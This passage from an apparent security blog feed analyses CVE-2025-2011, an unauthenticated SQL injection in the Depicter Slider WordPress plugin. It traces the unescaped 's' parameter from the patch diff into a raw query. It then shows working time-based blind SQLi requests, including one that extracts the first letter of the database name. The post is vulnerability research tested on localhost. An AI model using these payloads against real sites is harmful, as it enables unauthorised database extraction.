0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable and patched versions.&#xA;A notable difference appears in &lt;strong&gt;app/src/Controllers/Ajax/LeadsAjaxController.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;index&lt;/code&gt;, &lt;code&gt;list&lt;/code&gt;, and &lt;code&gt;export&lt;/code&gt; are three key functions inside the &lt;code&gt;LeadsAjaxController&lt;/code&gt; class.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function index(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;         =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response   = \Depicter::lead()-&amp;gt;get($args);&#xA;    $statusCode = isset($response[&amp;#39;errors&amp;#39;]) ? 400 : 200;&#xA;&#xA;    return \Depicter::json($response)-&amp;gt;withStatus($statusCode);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function list(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    return \Depicter::json($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public function export(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        // other logic&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    // other logic&#xA;&#xA;    return \Depicter::json([&#xA;        &amp;#39;errors&amp;#39; =&amp;gt; [__(&amp;#39;error occurred during the export process&amp;#39;, &amp;#39;depicter&amp;#39;)]&#xA;    ])-&amp;gt;withStatus(400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All three functions were patched by replacing &lt;code&gt;Sanitize::textfield&lt;/code&gt; with &lt;code&gt;Sanitize::sql&lt;/code&gt;, ensuring the &lt;code&gt;&#39;s&#39;&lt;/code&gt; parameter is properly sanitized and SQL-escaped.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/patch_dif.png&#34; title=&#34;Illustration of patched vs vulnerable code differences&#34; data-thumbnail=&#34;/posts/2025-09-30-cve-2025-2011/patch_dif.png&#34; data-sub-html=&#34;&lt;h2&gt;patch diff&lt;/h2&gt;&lt;p&gt;Illustration of patched vs vulnerable code differences&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-30-cve-2025-2011/patch_dif.png&#39; alt=&#34;patch diff&#34; height=&#34;201&#34; width=&#34;683&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Illustration of patched vs vulnerable code differences&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;To understand how &lt;code&gt;textfield&lt;/code&gt; and &lt;code&gt;sql&lt;/code&gt; functions behave, search for the keyword &lt;code&gt;function textfield&lt;/code&gt;. They likely reside in the same file since both are called from the same class &lt;code&gt;Sanitize&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;If you have the &lt;strong&gt;PHP Intelephense Extension&lt;/strong&gt; installed in &lt;strong&gt;VSCode&lt;/strong&gt;, you can navigate directly to the function definition using &lt;kbd&gt;Ctrl&lt;/kbd&gt; + &lt;kbd&gt;Click&lt;/kbd&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_1.png&#34; title=&#34;Searching for textfield function in Sanitize class&#34; data-thumbnail=&#34;/posts/2025-09-30-cve-2025-2011/search_1.png&#34; data-sub-html=&#34;&lt;h2&gt;search 1&lt;/h2&gt;&lt;p&gt;Searching for textfield function in Sanitize class&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_1.png&#39; alt=&#34;search 1&#34; height=&#34;248&#34; width=&#34;1243&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Searching for textfield function in Sanitize class&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;textfield&lt;/code&gt; returns data sanitized by &lt;code&gt;sanitize_text_field&lt;/code&gt;, while &lt;code&gt;sql&lt;/code&gt; returns SQL-escaped data using &lt;code&gt;esc_sql()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function sql( $input )&#xA;{&#xA;    return esc_sql( $input );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since this is an &lt;strong&gt;unauthenticated&lt;/strong&gt; vulnerability, we need to identify which of the three functions are called without any authentication mechanism. Once confirmed, we can trace deeper into the logic to verify potential SQL injection exploitation.&lt;/p&gt;&#xA;&lt;p&gt;Searching directly by function names like &lt;code&gt;index&lt;/code&gt;, &lt;code&gt;list&lt;/code&gt;, or &lt;code&gt;export&lt;/code&gt; may yield too many results. Instead, search for the class name &lt;code&gt;LeadsAjaxController&lt;/code&gt; since all functions must be invoked through it.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_2.png&#34; title=&#34;Searching for LeadsAjaxController usage in source code&#34; data-thumbnail=&#34;/posts/2025-09-30-cve-2025-2011/search_2.png&#34; data-sub-html=&#34;&lt;h2&gt;search 2&lt;/h2&gt;&lt;p&gt;Searching for LeadsAjaxController usage in source code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_2.png&#39; alt=&#34;search 2&#34; height=&#34;686&#34; width=&#34;1341&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Searching for LeadsAjaxController usage in source code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 The &lt;code&gt;LeadsAjaxController&lt;/code&gt; is used during &lt;strong&gt;Ajax route registration&lt;/strong&gt;. When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php?action=action_here&amp;amp;param1=...&lt;/code&gt;, WordPress maps the request via &lt;code&gt;handle(&#39;LeadsAjaxController@function&#39;)&lt;/code&gt; to the corresponding method.&lt;/p&gt;&#xA;&lt;p&gt;All three functions are invoked using the &lt;strong&gt;GET&lt;/strong&gt; method, but &lt;code&gt;export&lt;/code&gt; includes a &lt;code&gt;csrf-api&lt;/code&gt; middleware, so we can exclude it. We&amp;rsquo;ll focus only on &lt;code&gt;index&lt;/code&gt; and &lt;code&gt;list&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;When analyzing &lt;code&gt;index&lt;/code&gt;, we see that &lt;code&gt;$response&lt;/code&gt; calls &lt;code&gt;\Depicter::lead()-&amp;gt;get($args)&lt;/code&gt;, which internally calls &lt;code&gt;\Depicter::leadRepository()-&amp;gt;getResults($args)&lt;/code&gt;. This is the same logic as &lt;code&gt;list&lt;/code&gt;, so &lt;code&gt;list&lt;/code&gt; is our main tracing point.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function list(RequestInterface $request, $view)&#xA;{&#xA;    $args = [&#xA;        &amp;#39;s&amp;#39;                =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;s&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;ids&amp;#39;              =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;ids&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;sources&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;sources&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;dateStart&amp;#39;        =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;dateStart&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;dateEnd&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;dateEnd&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;order&amp;#39;            =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;order&amp;#39;, &amp;#39;DESC&amp;#39;)),&#xA;        &amp;#39;orderBy&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;orderBy&amp;#39;, &amp;#39;id&amp;#39;)),&#xA;        &amp;#39;page&amp;#39;             =&amp;gt; Sanitize::int($request-&amp;gt;query(&amp;#39;page&amp;#39;, 1)),&#xA;        &amp;#39;perPage&amp;#39;          =&amp;gt; Sanitize::int($request-&amp;gt;query(&amp;#39;perpage&amp;#39;, 10)),&#xA;        &amp;#39;columns&amp;#39;          =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;columns&amp;#39;, &amp;#39;&amp;#39;)),&#xA;        &amp;#39;includeFields&amp;#39;    =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;includeFields&amp;#39;, false)),&#xA;        &amp;#39;skipCustomFields&amp;#39; =&amp;gt; Sanitize::textfield($request-&amp;gt;query(&amp;#39;skipCustomFields&amp;#39;, false))&#xA;    ];&#xA;&#xA;    $response = \Depicter::leadRepository()-&amp;gt;getResults($args);&#xA;&#xA;    return \Depicter::json($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To understand how &lt;code&gt;getResults&lt;/code&gt; executes its query, search for &lt;code&gt;function getResults&lt;/code&gt; or use &lt;kbd&gt;Ctrl&lt;/kbd&gt; + &lt;kbd&gt;Click&lt;/kbd&gt; on &lt;code&gt;getResults&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_3.png&#34; title=&#34;Definition of getResults function in LeadRepository class&#34; data-thumbnail=&#34;/posts/2025-09-30-cve-2025-2011/search_3.png&#34; data-sub-html=&#34;&lt;h2&gt;search 3&lt;/h2&gt;&lt;p&gt;Definition of getResults function in LeadRepository class&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-30-cve-2025-2011/search_3.png&#39; alt=&#34;search 3&#34; height=&#34;326&#34; width=&#34;1126&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Definition of getResults function in LeadRepository class&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 Two &lt;code&gt;getResults&lt;/code&gt; functions appear. Based on the class name &lt;code&gt;LeadRepository&lt;/code&gt; and the &lt;code&gt;leadRepository()&lt;/code&gt; function, it’s likely that &lt;code&gt;Depicter::leadRepository()&lt;/code&gt; returns an &lt;strong&gt;instance&lt;/strong&gt; of &lt;code&gt;LeadRepository&lt;/code&gt;. The correct function can be confirmed by checking the number of parameters.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;if&lt;/code&gt; condition shows that when &lt;code&gt;includeFields&lt;/code&gt; is empty, &lt;code&gt;getLeadsResults&lt;/code&gt; is called. Let’s look at it:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function getLeadsResults( $args ){&#xA;    // Purpose of joining tables is being able to search in leadField values as well&#xA;    $leadTable = $this-&amp;gt;lead()-&amp;gt;getTable();&#xA;    $leads = Lead::new()-&amp;gt;select(&#xA;        &amp;#34;{$leadTable}.id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.source_id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.content_id&amp;#34;,&#xA;        &amp;#34;{$leadTable}.content_name&amp;#34;,&#xA;        &amp;#34;{$leadTable}.created_at&amp;#34;,&#xA;        &amp;#34;lf.name as fieldName&amp;#34;,&#xA;        &amp;#34;lf.value as fieldValue&amp;#34;&#xA;    )-&amp;gt;join( &amp;#34;{$this-&amp;gt;leadField()-&amp;gt;getTable()} AS lf&amp;#34;, &amp;#34;{$leadTable}.id&amp;#34;, &amp;#34;=&amp;#34;, &amp;#34;lf.lead_id&amp;#34; );&#xA;&#xA;    // other logic&#xA;&#xA;    if( ! empty( $args[&amp;#39;s&amp;#39;] ) ){&#xA;        $search = &amp;#34;&amp;#39;%&amp;#34;. $args[&amp;#39;s&amp;#39;] .&amp;#34;%&amp;#39;&amp;#34;;&#xA;        $leads-&amp;gt;appendRawWhere(&amp;#39;AND&amp;#39;, &amp;#34;( lf.value like {$search} OR {$leadTable}.content_name like {$search} )&amp;#34;);&#xA;    }&#xA;&#xA;    $results = $this-&amp;gt;paginate( $leads, $args );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, the &lt;code&gt;s&lt;/code&gt; parameter (which the patch protects) is concatenated directly into the query using &lt;code&gt;appendRawWhere&lt;/code&gt;.&#xA;Part of the resulting query would be:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;AND (lf.value like &amp;#39;%s_here%&amp;#39; OR leadtable.content_name like &amp;#39;%s_here%&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Thus, when sending a &lt;strong&gt;GET request&lt;/strong&gt; to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with parameters:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;action=depicter-lead-index&amp;amp;s=payload_here&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;list&lt;/code&gt; is called with only the &lt;code&gt;s&lt;/code&gt; parameter provided.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;getResults&lt;/code&gt; receives &lt;code&gt;$args&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The condition &lt;code&gt;if( ! $args[&#39;includeFields&#39;] )&lt;/code&gt; triggers &lt;code&gt;getLeadsResults&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The vulnerable SQL query executes, leading to SQL Injection.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a &lt;strong&gt;GET request&lt;/strong&gt; with a time-based SQLi payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=depicter-lead-list&amp;amp;s=999%25&amp;#39;&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;SLEEP(5))a))&amp;#43;--&amp;#43;-&amp;#43; HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Decoded payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- -&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This makes part of the query:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;AND (lf.value like &amp;#39;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- &amp;#39; OR leadtable.content_name like &amp;#39;999%&amp;#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/resp_time.png&#34; title=&#34;Response time showing the payload execution&#34; data-thumbnail=&#34;/posts/2025-09-30-cve-2025-2011/resp_time.png&#34; data-sub-html=&#34;&lt;h2&gt;response time&lt;/h2&gt;&lt;p&gt;Response time showing the payload execution&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-09-30-cve-2025-2011/resp_time.png&#39; alt=&#34;response time&#34; height=&#34;293&#34; width=&#34;434&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Response time showing the payload execution&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 The delayed response confirms the injection worked.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Subquery in FROM clause&lt;/strong&gt;: The subquery acts as a temporary table, forcing MySQL to execute it first, delaying the main query execution.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;To fully dump data, we must first confirm we can extract at least one character of the database name.&lt;/p&gt;&#xA;&lt;p&gt;Send a request with the following &lt;strong&gt;SQLi payload&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=depicter-lead-list&amp;amp;s=999%25&amp;#39;&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))&amp;#43;--&amp;#43;-&amp;#43; HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;Cookie: cookie_here&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;SUBSTRING()&lt;/code&gt; extracts the first letter of the &lt;strong&gt;database name&lt;/strong&gt;, and &lt;code&gt;IF()&lt;/code&gt; triggers &lt;code&gt;SLEEP(5)&lt;/code&gt; if the first character equals &lt;code&gt;0x77&lt;/code&gt; (&lt;code&gt;&#39;w&#39;&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Hex encoding (&lt;code&gt;0x77&lt;/code&gt;) is used because &lt;code&gt;s&lt;/code&gt; originates from a &lt;strong&gt;GET&lt;/strong&gt; parameter and is escaped by &lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;magic quotes&lt;/a&gt; and &lt;code&gt;sanitize_text_field&lt;/code&gt; in WordPress.&lt;/p&gt;&#xA;&lt;p&gt;👉 The delayed response confirms the first character is indeed &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-2011&lt;/strong&gt; vulnerability in the WordPress &lt;strong&gt;Depicter Slider&lt;/strong&gt; plugin (prior to version &lt;strong&gt;3.6.2&lt;/strong&gt;) arises from unvalidated user input being directly injected into SQL queries, leading to SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;The patch introduces SQL escaping, ensuring injected data is safely encapsulated within &lt;code&gt;&#39;%...%&#39;&lt;/code&gt; strings.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always validate and sanitize user input.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; when handling database queries in WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Keep plugins updated and conduct regular security audits to reduce exposure.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Depicter Slider Plugin &amp;lt;= 3.6.1 is vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-48118 Analysis &amp; POC</title>
